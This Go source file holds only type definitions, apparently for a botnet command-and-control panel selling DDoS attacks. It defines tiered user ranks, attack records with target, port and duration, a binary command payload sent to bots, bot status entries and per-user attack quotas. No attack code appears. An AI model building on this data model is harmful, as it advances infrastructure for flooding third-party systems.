package main

import (
	"net"
	"sync"
	"time"

	"github.com/golang-jwt/jwt/v4"
)

type rank int

const (
	rankOwner rank = iota
	rankAdmin
	rankPro
	rankBasic
)

type account struct {
	Username  string    `json:"username,omitempty"`
	Password  string    `json:"password,omitempty"`
	Expire    time.Time `json:"expire"`
	Level     string    `json:"level"`
	APIToken  string    `json:"api_token,omitempty"`
	APISecret string    `json:"api_secret,omitempty"`
}

func (a *account) rank() rank {
	switch a.Level {
	case "Owner":
		return rankOwner
	case "Admin":
		return rankAdmin
	case "Pro":
		return rankPro
	default:
		return rankBasic
	}
}

type attack struct {
	method  string
	target  string
	port    string
	dur     time.Duration
	started time.Time
	who     string
}

type cmdPayload struct {
	Method   [16]byte
	TargetIP [4]byte
	Port     uint16
	Duration uint32
	Pad      [16]byte
}

type sysInfo struct {
	OS     string `json:"os"`
	Arch   string `json:"arch"`
	CPU    string `json:"cpu,omitempty"`
	RAM    string `json:"ram,omitempty"`
	Uptime string `json:"uptime,omitempty"`
	Load1  string `json:"load_1,omitempty"`
	Load5  string `json:"load_5,omitempty"`
	Load15 string `json:"load_15,omitempty"`
	Disk   string `json:"disk_usage,omitempty"`
}

type botEntry struct {
	ID        string    `json:"id"`
	IP        string    `json:"ip"`
	ConnAt    time.Time `json:"connected"`
	LastPing  time.Time `json:"last_ping"`
	Status    string    `json:"status"`
	PingMs    int64     `json:"ping_ms"`
	Sys       sysInfo   `json:"system_info,omitempty"`
}

type sess struct {
	ID        string    `json:"id"`
	User      account   `json:"user"`
	IP        string    `json:"ip"`
	Agent     string    `json:"user_agent,omitempty"`
	LoginAt   time.Time `json:"login_time"`
	LastTouch time.Time `json:"last_active"`
	TTL       time.Time `json:"expires_at"`
	Token     string    `json:"token,omitempty"`
	Refresh   string    `json:"refresh_token,omitempty"`
	Revoked   bool      `json:"is_revoked"`
	JTI       string    `json:"jwt_id"`
	mu        sync.Mutex
}

type jwtClaims struct {
	SessID string `json:"session_id"`
	UID    string `json:"user_id"`
	Role   string `json:"user_level"`
	JTI    string `json:"jti"`
	jwt.RegisteredClaims
}

type loginAttempt struct {
	Count   int
	LastTry time.Time
	Lock    sync.Mutex
}

type quota struct {
	MaxConcurrent int
	MaxDaily      int
	MaxDur        time.Duration
	UsedToday     int
	ResetAt       time.Time
}

type anim struct {
	frames []string
	delay  time.Duration
}

type userConn struct {
	conn  net.Conn
	acct  account
	token string
	sid   string
}
